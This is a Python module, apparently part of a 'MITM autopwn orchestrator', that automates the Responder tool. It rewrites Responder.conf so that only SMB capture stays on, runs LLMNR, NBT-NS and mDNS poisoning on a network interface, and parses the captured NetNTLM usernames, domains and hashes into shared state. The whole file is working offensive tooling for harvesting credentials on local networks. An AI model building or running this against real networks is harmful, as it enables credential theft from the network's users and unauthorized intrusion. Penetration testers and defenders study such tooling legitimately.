"""
Responder control for the MITM autopwn orchestrator.
Runs Responder as a subprocess with LLMNR, NBT-NS, and mDNS poisoning plus SMB
hash capture, with the rogue HTTP, HTTPS, WPAD, DNS, and proxy servers disabled
so it does not collide with the bettercap transparent proxy. Parses poisoning
events and captured NetNTLM hashes from process output into shared state and
restores the original Responder.conf on exit.
"""

import os
import re
import shutil
import subprocess
import configparser


DISABLE_SERVERS = ["HTTP", "HTTPS", "WPAD", "DNS", "Proxy"]
KEEP_SERVERS = ["SMB"]

POISON_RE = re.compile(
    r"\[(LLMNR|NBT-NS|MDNS|DNS)\].*?to\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+for\s+(?:name\s+)?(\S+)",
    re.IGNORECASE,
)
CLIENT_RE = re.compile(
    r"\[[A-Z0-9\-]+\]\s+(NTLMv2-SSP|NTLMv1-SSP|NTLMv2|NTLMv1)\s+Client\s*:\s*(\S+)",
    re.IGNORECASE,
)
USER_RE = re.compile(
    r"\[[A-Z0-9\-]+\]\s+(?:NTLMv2-SSP|NTLMv1-SSP|NTLMv2|NTLMv1)\s+Username\s*:\s*(\S+)",
    re.IGNORECASE,
)
HASH_RE = re.compile(
    r"\[[A-Z0-9\-]+\]\s+(?:NTLMv2-SSP|NTLMv1-SSP|NTLMv2|NTLMv1)\s+Hash\s*:\s*(.+)$",
    re.IGNORECASE,
)


class ResponderRunner:
    def __init__(self, responder_path, iface, state):
        self.responder_path = responder_path
        self.responder_dir = os.path.dirname(os.path.abspath(responder_path))
        self.iface = iface
        self.state = state
        self.proc = None
        self._conf_path = os.path.join(self.responder_dir, "Responder.conf")
        self._conf_backup = self._conf_path + ".orchbak"
        self._pending = {}

    def patch_conf(self):
        if not os.path.isfile(self._conf_path):
            raise RuntimeError("Responder.conf not found at %s" % self._conf_path)
        if not os.path.isfile(self._conf_backup):
            shutil.copy2(self._conf_path, self._conf_backup)

        parser = configparser.ConfigParser()
        parser.optionxform = str
        parser.read(self._conf_path)

        section = self._core_section(parser)
        if section is not None:
            for server in DISABLE_SERVERS:
                if server in parser[section]:
                    parser[section][server] = "Off"
            for server in KEEP_SERVERS:
                if server in parser[section]:
                    parser[section][server] = "On"

        with open(self._conf_path, "w") as fh:
            parser.write(fh)
        self.state.log("responder", "conf patched, disabled %s" % ",".join(DISABLE_SERVERS))

    def _core_section(self, parser):
        for name in parser.sections():
            if name.strip().lower().startswith("responder core"):
                return name
        return None

    def restore_conf(self):
        if os.path.isfile(self._conf_backup):
            shutil.copy2(self._conf_backup, self._conf_path)
            try:
                os.remove(self._conf_backup)
            except OSError:
                pass

    def run(self):
        cmd = ["python3", os.path.basename(self.responder_path), "-I", self.iface, "-v"]
        self.proc = subprocess.Popen(
            cmd, cwd=self.responder_dir,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            bufsize=1, universal_newlines=True,
        )
        self.state.log("responder", "started on %s" % self.iface)

    def monitor(self, stop_event):
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            if stop_event.is_set():
                break
            self._parse_line(line.rstrip("\n"))

    def _parse_line(self, line):
        m = POISON_RE.search(line)
        if m:
            self.state.add_poison_hit(m.group(1).upper(), m.group(2), m.group(3))
            return

        m = CLIENT_RE.search(line)
        if m:
            self._pending = {"proto": m.group(1), "client": m.group(2)}
            return

        m = USER_RE.search(line)
        if m:
            self._pending["user"] = m.group(1)
            return

        m = HASH_RE.search(line)
        if m:
            sample = m.group(1).strip()
            user = self._pending.get("user", "")
            client = self._pending.get("client", "")
            proto = self._pending.get("proto", "NTLM")
            domain = ""
            if "\\" in user:
                domain, user = user.split("\\", 1)
            elif "::" in sample:
                parts = sample.split("::", 1)
                if len(parts) == 2 and ":" in parts[1]:
                    domain = parts[1].split(":", 1)[0]
            added = self.state.add_hash(client or "?", user or "?", domain or "?", proto, sample)
            if added:
                self.state.log("responder", "captured %s for %s\\%s" % (proto, domain, user))
            self._pending = {}

    def stop(self):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
        self.restore_conf()
